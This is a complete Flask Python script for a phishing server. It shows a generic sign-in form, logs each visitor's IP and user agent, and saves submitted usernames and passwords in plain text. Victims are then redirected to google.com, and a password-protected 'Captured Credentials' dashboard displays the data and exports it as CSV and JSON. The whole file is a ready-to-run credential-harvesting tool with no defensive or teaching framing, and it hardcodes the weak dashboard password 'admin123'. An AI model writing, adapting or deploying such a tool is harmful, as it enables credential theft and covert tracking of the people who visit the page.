from flask import Flask, request, render_template_string, redirect, Response
from functools import wraps
import datetime
import csv
import json
import io

app = Flask(__name__)

# --- Dashboard Authentication ---
DASHBOARD_USER = "admin"
DASHBOARD_PASS = "admin123"

def check_auth(username, password):
    return username == DASHBOARD_USER and password == DASHBOARD_PASS

def authenticate():
    return Response('Login required.', 401, {'WWW-Authenticate': 'Basic realm="Login Required"'})

def requires_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or not check_auth(auth.username, auth.password):
            return authenticate()
        return f(*args, **kwargs)
    return decorated

# --- Login Page HTML ---
login_page = '''
<!DOCTYPE html>
<html>
<head><title>Login</title></head>
<body>
  <h2>Sign in</h2>
  <form method="POST" action="/login">
    <input type="text" name="username" placeholder="Email"><br>
    <input type="password" name="password" placeholder="Password"><br>
    <input type="submit" value="Login">
  </form>
</body>
</html>
'''

# --- Dashboard Page HTML ---
dashboard_page = '''
<!DOCTYPE html>
<html>
<head><title>Dashboard</title></head>
<body>
  <h2>Captured Credentials</h2>
  <a href="/export/credentials.csv" download>Download as CSV</a>
  <pre>{{ credentials }}</pre>
  
  <h2>Visitor Logs</h2>
  <a href="/export/visitors.json" download>Download as JSON</a>
  <pre>{{ visitors }}</pre>
</body>
</html>
'''

# --- Routes ---
@app.route('/')
def home():
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open("visitor_logs.txt", "a") as file:
        file.write(f"[{timestamp}] IP: {ip} | User-Agent: {user_agent}\n")
    return render_template_string(login_page)

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    with open("captured_credentials.txt", "a") as f:
        f.write(f"Username: {username}, Password: {password}\n")
    return redirect("https://google.com")

@app.route('/dashboard')
@requires_auth
def dashboard():
    try:
        with open("captured_credentials.txt", "r") as f:
            credentials = f.read()
    except FileNotFoundError:
        credentials = "No credentials captured yet."
    try:
        with open("visitor_logs.txt", "r") as f:
            visitors = f.read()
    except FileNotFoundError:
        visitors = "No visitor logs yet."
    return render_template_string(dashboard_page, credentials=credentials, visitors=visitors)

@app.route('/export/credentials.csv')
@requires_auth
def export_credentials_csv():
    output = io.StringIO()
    writer = csv.writer(output)
    writer.writerow(['Username', 'Password'])
    try:
        with open("captured_credentials.txt", "r") as f:
            for line in f:
                parts = line.strip().split(", ")
                if len(parts) == 2:
                    username = parts[0].split(": ")[1]
                    password = parts[1].split(": ")[1]
                    writer.writerow([username, password])
    except FileNotFoundError:
        pass
    output.seek(0)
    return Response(output, mimetype='text/csv',
                    headers={"Content-Disposition": "attachment; filename=credentials.csv"})

@app.route('/export/visitors.json')
@requires_auth
def export_visitors_json():
    logs = []
    try:
        with open("visitor_logs.txt", "r") as f:
            for line in f:
                logs.append(line.strip())
    except FileNotFoundError:
        pass
    return Response(json.dumps(logs, indent=2), mimetype='application/json',
                    headers={"Content-Disposition": "attachment; filename=visitor_logs.json"})

# --- Run App ---
if __name__ == '__main__':
    app.run(port=5050)

